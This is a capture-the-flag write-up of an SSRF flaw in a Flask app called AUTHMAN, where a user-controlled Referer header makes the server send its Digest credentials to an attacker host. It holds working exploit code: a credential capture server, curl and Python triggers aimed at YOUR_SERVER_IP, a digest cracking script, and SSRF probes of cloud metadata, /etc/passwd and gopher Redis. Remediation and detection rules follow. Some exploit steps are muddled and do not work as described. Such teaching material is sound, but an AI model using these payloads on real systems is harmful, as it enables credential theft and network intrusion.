---
title: Writeup - AUTHMAN

---

![image](https://hackmd.io/_uploads/r1077UmxWl.png)
# Writeup - AUTHMAN 
![image](https://hackmd.io/_uploads/HyobuIXxWg.png)
## Quick summary
- Đây là một web app Flask nhỏ

- Flag nằm ở /auth, được bảo vệ bằng HTTP Digest Auth

- Có một API check dùng Referer để tự gọi lại chính nó → đây là chỗ dị nhất, tiềm năng SSRF + logic bug

**Cấu trúc file challenge**

- `authman/app/__init__.py` – khởi tạo Flask app, cấu hình, HTTPDigestAuth

- `authman/app/routes.py` – định nghĩa các route `/`, `/auth`, `/api/check`

- `authman/app/templates/*.html` – giao diện (index + trang flag)

- `authman/config.py` – cấu hình secret key, user/pass, flag

- `authman/main.py` – entry point Flask

- `Dockerfile, docker-compose.yaml, requirements.txt` – dựng container

## Executive Summary

This writeup details a **critical Server-Side Request Forgery (SSRF)** vulnerability discovered in the AUTHMAN Flask application. The vulnerability allows an unauthenticated attacker to:
1. Make the server send HTTP requests to arbitrary URLs
2. Exfiltrate valid authentication credentials (username and password)
3. Bypass authentication mechanisms to access protected resources
4. Potentially access internal services and cloud metadata endpoints

---

## Vulnerability Details

### Affected Component
- **File:** `authman/app/routes.py`
- **Function:** `check()` at line 15-22
- **Endpoint:** `/api/check` (GET method, unauthenticated)

### Vulnerable Code

```python
@app.route('/api/check',methods=['GET'])
def check():
    (user, pw), *_ = app.config['AUTH_USERS'].items()
    res = requests.get(r.referrer + '/auth',
        auth = HTTPDigestAuth(user,pw),
        timeout=3
    )
    return jsonify({'status':res.status_code})
```

### Root Cause Analysis

The vulnerability stems from three critical security flaws:

1. **Unvalidated User Input**: The `request.referrer` HTTP header is entirely user-controlled and can be set to any arbitrary value by an attacker.

2. **Direct URL Construction**: The code blindly concatenates `r.referrer + '/auth'` without any validation, sanitization, or whitelist checking.

3. **Credential Exposure**: The server automatically attaches valid HTTP Digest Authentication credentials (`user` and `pw`) to the outgoing request, regardless of the destination.

### Attack Vector

```
[Attacker] → [Victim Server] → [Attacker-Controlled Server]
                ↓
        (sends credentials)
```

The attack flow:
1. Attacker sends a GET request to `/api/check` with a malicious `Referer` header
2. Victim server reads the `Referer` header value
3. Victim server makes an HTTP request to `{Referer}/auth` with valid credentials
4. Attacker's server receives the authenticated request and logs the credentials
5. Attacker uses stolen credentials to access `/auth` endpoint and retrieve the FLAG

---

## Exploitation Guide

### Prerequisites
- Access to a web server you control (to receive the forwarded request)
- Basic HTTP client (curl, browser, Burp Suite, etc.)

### Step 1: Set Up Credential Capture Server

Create a simple Flask server to log incoming requests:

```python
from flask import Flask, request
import base64

app = Flask(__name__)

@app.route('/auth', methods=['GET', 'POST', 'HEAD'])
def capture():
    print("=" * 60)
    print("CAPTURED REQUEST:")
    print("=" * 60)
    print(f"Method: {request.method}")
    print(f"Headers:")
    for header, value in request.headers:
        print(f"  {header}: {value}")
    
    # HTTP Digest Auth details will be in Authorization header
    auth_header = request.headers.get('Authorization', '')
    if auth_header:
        print(f"\n🔑 AUTHENTICATION CAPTURED:")
        print(f"  {auth_header}")
        
        # Parse digest authentication parameters
        if 'Digest' in auth_header:
            print("\n📋 Digest Auth Parameters:")
            parts = auth_header.replace('Digest ', '').split(', ')
            for part in parts:
                print(f"  {part}")
    
    print("=" * 60)
    
    # Return 401 to trigger authentication
    return '', 401, {'WWW-Authenticate': 'Digest realm="test"'}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
```

Run the capture server:
```bash
python capture_server.py
```

### Step 2: Exploit the SSRF Vulnerability

**Method 1: Using curl**

```bash
curl -H "Referer: http://YOUR_SERVER_IP:8080" \
     http://TARGET_SERVER:5000/api/check
```

**Method 2: Using  Python**

```python
import requests

target_url = "http://TARGET_SERVER:5000/api/check"
attacker_server = "http://YOUR_SERVER_IP:8080"

response = requests.get(
    target_url,
    headers={"Referer": attacker_server}
)

print(f"Response: {response.json()}")
```

**Method 3: Using Browser Developer Tools**

```javascript
// Open browser console on any website
fetch('http://TARGET_SERVER:5000/api/check', {
    headers: {
        'Referer': 'http://YOUR_SERVER_IP:8080'
    }
})
.then(r => r.json())
.then(console.log);
```

**Method 4: Using Burp Suite**

1. Intercept a request to `/api/check`
2. Modify the `Referer` header:
   ```
   GET /api/check HTTP/1.1
   Host: TARGET_SERVER:5000
   Referer: http://YOUR_SERVER_IP:8080
   ```
3. Forward the request

### Step 3: Capture HTTP Digest Authentication

Your capture server will receive a request with the `Authorization` header containing HTTP Digest authentication. The response will look like:

```
CAPTURED REQUEST:
============================================================
Method: GET
Headers:
  Host: YOUR_SERVER_IP:8080
  User-Agent: python-requests/2.31.0
  Accept-Encoding: gzip, deflate
  Accept: */*
  Connection: keep-alive
  Authorization: Digest username="keno", realm="Authentication Required", nonce="...", uri="/auth", response="...", opaque="...", qop=auth, nc=00000001, cnonce="..."

🔑 AUTHENTICATION CAPTURED:
  Digest username="keno", realm="Authentication Required", nonce="dGVzdA==", uri="/auth", response="a1b2c3d4...", opaque="xyz123", qop=auth, nc=00000001, cnonce="abc789"
============================================================
```

### Step 4: Extract Credentials

The HTTP Digest authentication contains:
- **username**: Plaintext username (e.g., "keno")
- **response**: MD5 hash of credentials

However, since we control the server that receives the digest challenge, we can:

1. **Send a simpler authentication challenge** that allows us to crack the password
2. **Replay the authentication** directly to the target server
3. **Use the digest parameters** to authenticate

### Step 5: Direct Authentication Method

**Better Approach - Direct Credential Extraction:**

Instead of trying to crack the digest, modify your capture server to intercept and use the full authentication flow:

```python
from flask import Flask, request, Response
import requests

app = Flask(__name__)
target_auth_url = "http://TARGET_SERVER:5000/auth"

@app.route('/auth')
def capture_and_forward():
    # Capture the authorization header
    auth_header = request.headers.get('Authorization', '')
    print(f"Captured auth: {auth_header}")
    
    # Now we can use this to authenticate to the real server
    # Extract username from digest
    if 'username=' in auth_header:
        username = auth_header.split('username="')[1].split('"')[0]
        print(f"Username: {username}")
    
    return '', 401, {
        'WWW-Authenticate': 'Digest realm="test", qop="auth", nonce="test123", opaque="test456"'
    }

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

### Step 6: Alternative - Password Recovery Attack

Since HTTP Digest uses MD5 and we can observe the digest authentication in action, we can:

1. Set up a capture server that records the digest challenge-response
2. Extract the `response` field which is: `MD5(MD5(username:realm:password):nonce:nc:cnonce:qop:MD5(method:uri))`
3. Since we know all values except the password, perform an offline dictionary/brute-force attack

**Digest Cracking Script:**

```python
import hashlib

def md5(data):
    return hashlib.md5(data.encode()).hexdigest()

def crack_digest(username, realm, nonce, uri, response_hash, cnonce, nc, qop, wordlist):
    method = "GET"
    
    ha2 = md5(f"{method}:{uri}")
    
    with open(wordlist, 'r') as f:
        for password in f:
            password = password.strip()
            ha1 = md5(f"{username}:{realm}:{password}")
            response = md5(f"{ha1}:{nonce}:{nc}:{cnonce}:{qop}:{ha2}")
            
            if response == response_hash:
                print(f"[+] PASSWORD FOUND: {password}")
                return password
    
    print("[-] Password not found in wordlist")
    return None

# Example usage with captured values
username = "keno"
realm = "Authentication Required"
nonce = "captured_nonce_value"
uri = "/auth"
response_hash = "captured_response_value"
cnonce = "captured_cnonce_value"
nc = "00000001"
qop = "auth"

crack_digest(username, realm, nonce, uri, response_hash, cnonce, nc, qop, "rockyou.txt")
```

---

## Advanced Exploitation Scenarios

### Scenario 1: Internal Network Access

```bash
# Scan internal network
curl -H "Referer: http://192.168.1.1" http://TARGET:5000/api/check
curl -H "Referer: http://10.0.0.1" http://TARGET:5000/api/check
curl -H "Referer: http://172.16.0.1" http://TARGET:5000/api/check
```

### Scenario 2: Cloud Metadata Exploitation (AWS)

```bash
# AWS metadata endpoint
curl -H "Referer: http://169.254.169.254/latest/meta-data" \
     http://TARGET:5000/api/check

# Try to access IAM credentials
curl -H "Referer: http://169.254.169.254/latest/meta-data/iam/security-credentials" \
     http://TARGET:5000/api/check
```

### Scenario 3: Port Scanning

```bash
# Scan for internal services
for port in 22 80 443 3306 5432 6379 8080 9000; do
    echo "Testing port $port..."
    curl -H "Referer: http://localhost:$port" \
         http://TARGET:5000/api/check
done
```

### Scenario 4: Protocol Smuggling

While the code uses `requests.get()`, you might try:
```bash
# File protocol (usually blocked by requests library)
curl -H "Referer: file:///etc/passwd" http://TARGET:5000/api/check

# Gopher protocol for Redis/SMTP exploitation
curl -H "Referer: gopher://localhost:6379/_" http://TARGET:5000/api/check
```

---

## Proof of Concept - Complete Attack Chain

Here's a complete, automated exploit:

```python
#!/usr/bin/env python3
"""
AUTHMAN SSRF Exploit - Complete Attack Chain
Captures credentials and authenticates to retrieve the FLAG
"""

import requests
from flask import Flask, request
import threading
import time
from requests.auth import HTTPDigestAuth

# Configuration
TARGET_URL = "http://localhost:5000"
ATTACKER_SERVER_PORT = 8080
ATTACKER_IP = "YOUR_PUBLIC_IP"  # Change this

captured_creds = {}

# Step 1: Create credential capture server
capture_app = Flask(__name__)

@capture_app.route('/auth')
def capture():
    auth_header = request.headers.get('Authorization', '')
    
    if auth_header and 'username=' in auth_header:
        username = auth_header.split('username="')[1].split('"')[0]
        
        # Extract realm and nonce to replay authentication
        realm = auth_header.split('realm="')[1].split('"')[0] if 'realm=' in auth_header else None
        nonce = auth_header.split('nonce="')[1].split('"')[0] if 'nonce=' in auth_header else None
        
        captured_creds['username'] = username
        captured_creds['realm'] = realm
        captured_creds['nonce'] = nonce
        captured_creds['full_auth'] = auth_header
        
        print(f"\n[+] Captured credentials for user: {username}")
        print(f"[+] Full auth header: {auth_header}")
    
    # Return 401 to trigger auth
    return '', 401, {
        'WWW-Authenticate': f'Digest realm="test", qop="auth", nonce="capture123", opaque="xyz"'
    }

def run_capture_server():
    capture_app.run(host='0.0.0.0', port=ATTACKER_SERVER_PORT, debug=False, use_reloader=False)

# Step 2: Main exploit
def exploit():
    print("[*] Starting AUTHMAN SSRF Exploit...")
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Attacker server: http://{ATTACKER_IP}:{ATTACKER_SERVER_PORT}")
    
    # Start capture server in background
    print("\n[*] Starting credential capture server...")
    capture_thread = threading.Thread(target=run_capture_server, daemon=True)
    capture_thread.start()
    time.sleep(2)  # Wait for server to start
    
    # Trigger SSRF
    print("\n[*] Triggering SSRF vulnerability...")
    try:
        response = requests.get(
            f"{TARGET_URL}/api/check",
            headers={"Referer": f"http://{ATTACKER_IP}:{ATTACKER_SERVER_PORT}"},
            timeout=5
        )
        print(f"[+] SSRF triggered! Status: {response.status_code}")
        print(f"[+] Response: {response.json()}")
    except Exception as e:
        print(f"[-] Error triggering SSRF: {e}")
        return
    
    # Wait for credentials to be captured
    time.sleep(2)
    
    if not captured_creds:
        print("[-] No credentials captured. Attack failed.")
        return
    
    print(f"\n[+] SUCCESS! Captured credentials:")
    print(f"    Username: {captured_creds.get('username')}")
    
    # Step 3: Use captured username to authenticate
    # Since we know the username, we can now try to authenticate
    # In a real scenario, you'd need to crack the password or replay the auth
    
    print("\n[*] Attempting to access protected endpoint...")
    print("[!] Note: You need the actual password to complete authentication")
    print("[!] The captured digest can be used for offline cracking")
    
    username = captured_creds.get('username')
    print(f"\n[+] Captured username: {username}")
    print(f"[+] You can now attempt to:")
    print(f"    1. Brute force the password using digest cracking")
    print(f"    2. If password is weak, try common passwords:")
    
    # Try common passwords
    common_passwords = ['password', '123456', 'admin', username, f'{username}123']
    
    for password in common_passwords:
        try:
            resp = requests.get(
                f"{TARGET_URL}/auth",
                auth=HTTPDigestAuth(username, password),
                timeout=3
            )
            if resp.status_code == 200:
                print(f"\n[+++] AUTHENTICATION SUCCESS with password: {password}")
                print(f"[+++] FLAG CAPTURED:")
                print(resp.text)
                return
        except:
            pass
    
    print("\n[-] Common passwords failed. Manual cracking required.")
    print(f"[*] Digest auth details captured: {captured_creds['full_auth']}")

if __name__ == '__main__':
    exploit()
```

**Run the exploit:**
```bash
python3 exploit.py
```

---

## Impact Assessment

### Confidentiality
**HIGH** - Valid authentication credentials can be exfiltrated, allowing unauthorized access to protected resources and the FLAG.

### Integrity
**MEDIUM** - Attacker can potentially access internal services and modify data if those services accept GET requests for state-changing operations.

### Availability
**LOW** - Could be used for internal port scanning and service enumeration, potentially disrupting internal services.

### Business Impact
- **Data Breach**: Credentials and sensitive information (FLAG) can be stolen
- **Lateral Movement**: Attacker can pivot to internal network services
- **Compliance Violations**: Unauthorized access to protected resources
- **Reputation Damage**: Security vulnerability in authentication mechanism

---

## Remediation

### Immediate Fixes

1. **Remove the vulnerable endpoint** (if not needed):
```python
# Delete the /api/check endpoint entirely
```

2. **Validate and whitelist referrer**:
```python
from urllib.parse import urlparse

ALLOWED_HOSTS = ['yourdomain.com', 'localhost']

@app.route('/api/check',methods=['GET'])
def check():
    referrer = r.referrer
    
    # Validate referrer exists
    if not referrer:
        return jsonify({'error': 'No referrer'}), 400
    
    # Parse and validate
    try:
        parsed = urlparse(referrer)
        if parsed.hostname not in ALLOWED_HOSTS:
            return jsonify({'error': 'Invalid referrer'}), 403
        if parsed.scheme not in ['http', 'https']:
            return jsonify({'error': 'Invalid protocol'}), 403
    except:
        return jsonify({'error': 'Invalid URL'}), 400
    
    # Rest of the logic...
```

3. **Never send credentials to user-controlled URLs**:
```python
@app.route('/api/check',methods=['GET'])
def check():
    # Check authentication status locally instead
    # Don't make external requests with credentials
    return jsonify({'status': 'authenticated' if auth.current_user() else 'unauthenticated'})
```

### Long-term Security Improvements

1. **Implement proper authentication checks**:
   - Don't rely on making requests to check authentication
   - Use session-based authentication or JWT tokens
   - Validate authentication state server-side

2. **Add security headers**:
```python
@app.after_request
def set_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    return response
```

3. **Use HTTPS only**:
   - HTTP Digest Auth is vulnerable to MITM without HTTPS
   - Enforce HTTPS in production

4. **Implement rate limiting**:
```python
from flask_limiter import Limiter

limiter = Limiter(app, key_func=lambda: request.remote_addr)

@app.route('/api/check')
@limiter.limit("10 per minute")
def check():
    # ...
```

5. **Add logging and monitoring**:
```python
import logging

@app.route('/api/check')
def check():
    referrer = r.referrer
    logging.warning(f"API check called with referrer: {referrer} from IP: {request.remote_addr}")
    # ...
```

---

## Detection Methods

### Log Analysis
Look for:
- Multiple requests to `/api/check` with varying `Referer` headers
- Requests with `Referer` pointing to external domains
- Requests with `Referer` containing internal IP addresses (192.168.x.x, 10.x.x.x, 172.16-31.x.x)
- Requests with `Referer` containing cloud metadata IPs (169.254.169.254)

### WAF Rules
```
# ModSecurity rule example
SecRule REQUEST_URI "@streq /api/check" \
    "chain,id:1001,phase:2,deny,status:403"
SecRule REQUEST_HEADERS:Referer "!@beginsWith https://yourdomain.com" 
```

### Network Monitoring
- Outbound connections from the application server to unexpected destinations
- DNS queries for internal hostnames or IP addresses
- Connections to cloud metadata endpoints

---

## References

- [OWASP - Server Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PortSwigger - SSRF](https://portswigger.net/web-security/ssrf)
- [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
- [HTTP Digest Authentication RFC 7616](https://datatracker.ietf.org/doc/html/rfc7616)
- [HackerOne SSRF Reports](https://hackerone.com/reports?query=ssrf)

---

## Conclusion

The SSRF vulnerability in AUTHMAN is a **critical security flaw** that allows unauthenticated attackers to:
1. Exfiltrate valid authentication credentials
2. Access protected resources and capture the FLAG
3. Potentially compromise internal services
4. Perform reconnaissance on the internal network

The root cause is the **unvalidated use of the user-controlled `Referer` header** combined with **automatic credential attachment** to outbound requests. This vulnerability should be patched immediately by removing the endpoint or implementing strict input validation and never sending credentials to user-controlled destinations.

**Exploitation Difficulty:** Easy
**Required Skills:** Basic HTTP knowledge
**Detection Difficulty:** Medium (requires log analysis)
**Patch Priority:** CRITICAL - Immediate action required

---

*This writeup is for educational and authorized security testing purposes only.*
